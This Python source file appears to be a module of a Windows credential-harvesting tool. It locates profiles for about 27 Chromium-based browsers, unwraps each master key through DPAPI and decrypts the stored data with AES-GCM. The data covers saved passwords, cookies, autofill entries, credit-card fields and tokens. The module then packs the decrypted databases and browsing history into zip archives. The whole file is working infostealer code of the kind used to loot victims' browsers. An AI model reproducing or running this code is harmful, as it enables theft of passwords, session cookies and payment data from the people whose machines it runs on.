# -*- coding: utf-8 -*-
import base64
import json
import os
import shutil
import sqlite3
import tempfile
import traceback
import zipfile

from Crypto.Cipher import AES

from winsecs.utils import log, CryptUnprotectData


class Chromium:
    def __init__(self, paths):
        self.paths = paths if isinstance(paths, list) else [paths]

    def db_dirs(self, profile):
        """
        Return database directories for all profiles within all paths
        """
        databases = set()
        for path in self.paths:
            path = path.format(**profile)

            profiles_path = os.path.join(path, 'Local State')
            if not os.path.isfile(profiles_path):
                continue

            master_key = None
            # List all users profile (empty string means current dir, without a profile)
            profiles = {'Default', ''}

            # Automatic join all other additional profiles
            for dirs in os.listdir(path):
                if os.path.isdir(os.path.join(path, dirs)) and dirs.startswith('Profile'):
                    profiles.add(dirs)

            with open(profiles_path, 'rb') as f:
                try:
                    data = json.load(f)
                    # Add profiles from json to Default profile. set removes duplicates
                    profiles |= set(data['profile']['info_cache'].keys())
                except Exception:
                    pass

            with open(profiles_path, 'rb') as f:
                try:
                    master_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]  # removing DPAPI
                    master_key = CryptUnprotectData(master_key, profile)
                except Exception:
                    master_key = None

            # Each profile has its own password database
            for prof in profiles:
                # Some browsers use names other than "Login Data"
                # Like YandexBrowser - "Ya Login Data", UC Browser - "UC Login Data.18"
                try:
                    db_files = os.listdir(os.path.join(path, prof))
                except Exception:
                    continue
                for db in db_files:
                    if db.lower() in ['login data', 'ya passman data']:
                        databases.add((os.path.join(path, prof, db), master_key))
        return list(databases)

    def dump(self, profile, password, master_key, is_yandex):
        pwd = None
        # Yandex passwords use a masterkey stored on windows credential manager
        # https://yandex.com/support/browser-passwords-crypto/without-master.html
        if is_yandex:
            try:
                try:
                    p = json.loads(str(password))
                except Exception:
                    p = json.loads(password)

                pwd = base64.b64decode(p['p'])
            except Exception:
                # New version does not use json format
                pass

            # Passwords are stored using AES-256-GCM algorithm
            # The key used to encrypt is stored on the credential manager

            # yandex_enckey:
            #   - 4 bytes should be removed to be 256 bits
            #   - these 4 bytes correspond to the nonce ?

            # cipher = AES.new(yandex_enckey, AES.MODE_GCM)
            # plaintext = cipher.decrypt(password)
            # Failed...
        elif isinstance(password, bytes) and password.startswith(b'v10'):
            if master_key:
                # chromium version > 80
                try:
                    iv = password[3:15]
                    payload = password[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    pwd = cipher.decrypt(payload)[:-16]  # remove suffix bytes
                    try:
                        pwd = pwd.decode()
                    except:
                        pass
                except:
                    pass
        else:
            try:
                pwd = CryptUnprotectData(password, profile)
            except:
                try:
                    pwd = CryptUnprotectData(password, profile)
                except:
                    pass

            try:
                pwd = pwd.decode()
            except:
                pass

        return pwd

    def creds_dump(self, profile, db_path, is_yandex=False, master_key=None):
        credentials = set()
        # yandex_enckey = None

        # if is_yandex:
        #     try:
        #         credman_passwords = Credman().run()
        #         for credman_password in credman_passwords:
        #             if b'Yandex' in credman_password.get('URL', b''):
        #                 if credman_password.get('Password'):
        #                     yandex_enckey = credman_password.get('Password')
        #                     log.info(f'EncKey found: {yandex_enckey!r}')
        #         assert yandex_enckey
        #     except Exception:
        #         log.debug(traceback.format_exc())
        #         # Passwords could not be decrypted without encKey
        #         log.info('EncKey has not been retrieved')
        #         return []

        try:
            conn = sqlite3.connect(db_path)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute('SELECT storage_key, metadata FROM sync_entities_metadata')
            for storage_key, metadata in cursor.fetchall():
                try:
                    pwd = self.dump(profile, metadata, master_key, is_yandex)
                    cursor.execute("UPDATE sync_entities_metadata SET metadata = ? WHERE storage_key = ?", (pwd, storage_key))
                except Exception:
                    log.debug(traceback.format_exc())

            conn.commit()
            conn.close()
        except Exception:
            log.debug(traceback.format_exc())

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value, id FROM logins')
        except Exception:
            log.debug(traceback.format_exc())
            return []

        for url, login, password, ID in cursor.fetchall():
            try:
                pwd = self.dump(profile, password, master_key, is_yandex)
                cursor.execute("UPDATE logins SET password_value = ? WHERE id = ?", (pwd, ID))

                if not url and not login and not pwd:
                    continue

                credentials.add((url, login, pwd))
            except Exception:
                log.debug(traceback.format_exc())

        conn.commit()
        conn.close()
        return list(credentials)

    def cookie_dump(self, profile, db_path, master_key=None):
        length = 0
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
        except Exception:
            log.debug(traceback.format_exc())
            return 0

        for host_key, name, encrypted_value in cursor.fetchall():
            try:
                decrypted_value = self.dump(profile, encrypted_value, master_key, False)
                cursor.execute("UPDATE cookies SET encrypted_value = ? WHERE host_key = ? AND name = ?", (decrypted_value, host_key, name))
                length += 1
            except Exception:
                log.debug(traceback.format_exc())

        conn.commit()
        conn.close()
        return length

    def webdata_dump(self, profile, db_path, master_key=None):
        d = {
            'autofill': ['value', 'value_lower'],
            'autofill_profile_edge_extended': ['date_of_birth'],
            'autofill_profile_emails': ['email'],
            'autofill_profile_names': ['first_name', 'middle_name', 'last_name', 'full_name'],
            'autofill_profile_phones': ['number'],
            'autofill_profiles': ['company_name', 'street_address', 'dependent_locality', 'city', 'state', 'zipcode', 'sorting_code', 'country_code'],
            'credit_card_tags_v2': ['tag'],
            'credit_cards': ['name_on_card', 'expiration_month', 'expiration_year', 'card_number_encrypted'],
            'token_service': ['encrypted_token']
        }
        length = 0
        for i in d:
            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute(f'SELECT {"service" if i == "token_service" else "guid"}, {", ".join(d[i])} FROM {i}')
            except Exception:
                log.debug(traceback.format_exc())
                continue

            for res in cursor.fetchall():
                try:
                    result = [self.dump(profile, me, master_key, False)for me in res[1:]] + [res[0]]
                    cursor.execute(
                        f'UPDATE {i} SET {" = ?, ".join(d[i])} = ? WHERE {"service" if i == "token_service" else "guid"} = ?',
                        tuple(result)
                    )
                    length += 1
                except Exception:
                    log.debug(traceback.format_exc())

            conn.commit()
            conn.close()
        return length

    def run(self, profile):
        credentials = {}
        databases = self.db_dirs(profile)

        for db_path, master_key in databases:

            log.debug('Database found: {db}'.format(db=db_path))

            # Copy database before to query it (bypass lock errors)
            temp = tempfile.mkdtemp()
            file = shutil.copy(db_path, temp)
            log.debug(f'Temporary db copied: {temp}')
            credentials[os.path.dirname(db_path)] = {'FingerPrint': temp + '.zip', 'Credentials': []}
            try:
                found = self.creds_dump(profile, file, ('yandex' in db_path.lower()), master_key)
                if found:
                    credentials[os.path.dirname(db_path)]['Credentials'] = found
            except Exception:
                log.debug(traceback.format_exc())

            for i in [
                'Bookmarks', 'History', 'Network Action Predictor', 'Network Persistent State',
                'Preferences', 'QuotaManager', 'Shortcuts', 'Top Sites', 'TransportSecurity'
            ]:
                db_path = os.path.join(os.path.split(db_path)[0], i)
                if os.path.exists(db_path):
                    shutil.copy(db_path, temp)

            db_path = os.path.join(os.path.split(db_path)[0], 'Cookies')
            if os.path.exists(db_path):
                file = shutil.copy(db_path, temp)
                try:
                    found = self.cookie_dump(profile, file, master_key)
                except Exception:
                    log.debug(traceback.format_exc())

            db_path = os.path.join(os.path.split(db_path)[0], 'Web Data')
            if os.path.exists(db_path):
                file = shutil.copy(db_path, temp)
                try:
                    found = self.webdata_dump(profile, file, master_key)
                except Exception:
                    log.debug(traceback.format_exc())

            src = temp
            dst = src + '.zip'
            with zipfile.ZipFile(dst, "w", zipfile.ZIP_LZMA) as zf:
                for dirname, subdirs, files in os.walk(src):
                    for filename in files:
                        absname = os.path.abspath(os.path.join(dirname, filename))
                        zf.write(absname, absname[len(src) + 1:])
            shutil.rmtree(temp)

        return credentials


class UCBrowser(Chromium):
    def __init__(self):
        pass

    def db_dirs(self, profile):
        uc = '{LOCALAPPDATA}\\UCBrowser'
        try:
            # UC Browser seems to have random characters appended to the User Data dir so we'll list them all
            self.paths = [os.path.join(uc, d) for d in os.listdir(uc.format(**profile))]
        except Exception:
            self.paths = []
        return Chromium.db_dirs(self, profile)


browsers_address = {
    '7Star': '{LOCALAPPDATA}\\7Star\\7Star\\User Data',
    'amigo': '{LOCALAPPDATA}\\Amigo\\User Data',
    'brave': '{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data',
    'centbrowser': '{LOCALAPPDATA}\\CentBrowser\\User Data',
    'chedot': '{LOCALAPPDATA}\\Chedot\\User Data',
    'chrome canary': '{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data',
    'chromium': '{LOCALAPPDATA}\\Chromium\\User Data',
    'coccoc': '{LOCALAPPDATA}\\CocCoc\\Browser\\User Data',
    # Comodo IceDragon is Firefox-based
    'comodo dragon': '{LOCALAPPDATA}\\Comodo\\Dragon\\User Data',
    'elements browser': '{LOCALAPPDATA}\\Elements Browser\\User Data',
    'epic privacy browser': '{LOCALAPPDATA}\\Epic Privacy Browser\\User Data',
    'google chrome': '{LOCALAPPDATA}\\Google\\Chrome\\User Data',
    'kometa': '{LOCALAPPDATA}\\Kometa\\User Data',
    'opera': '{APPDATA}\\Opera Software\\Opera Stable',
    'orbitum': '{LOCALAPPDATA}\\Orbitum\\User Data',
    'sputnik': '{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data',
    'torch': '{LOCALAPPDATA}\\Torch\\User Data',
    'uran': '{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data',
    'vivaldi': '{LOCALAPPDATA}\\Vivaldi\\User Data',
    'yandexBrowser': '{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data',
    'microsoft edge': '{LOCALAPPDATA}\\Microsoft\\Edge\\User Data',
    'blisk': '{LOCALAPPDATA}\\Blisk\\User Data',
    'iron browser': '{LOCALAPPDATA}\\Iron Browser\\User Data',
    'ungoogled chromium': '{LOCALAPPDATA}\\Ungoogled Chromium\\User Data',
    'avast secure browser': '{LOCALAPPDATA}\\AVAST Software\\Browser\\User Data',
    'qihoo 360': '{LOCALAPPDATA}\\360Browser\\Browser\\User Data',
    'cryptotab browser': '{LOCALAPPDATA}\\CryptoTab Browser\\User Data'
}

modules = {i: Chromium(browsers_address[i]) for i in browsers_address}
modules["uc browser"] = UCBrowser()
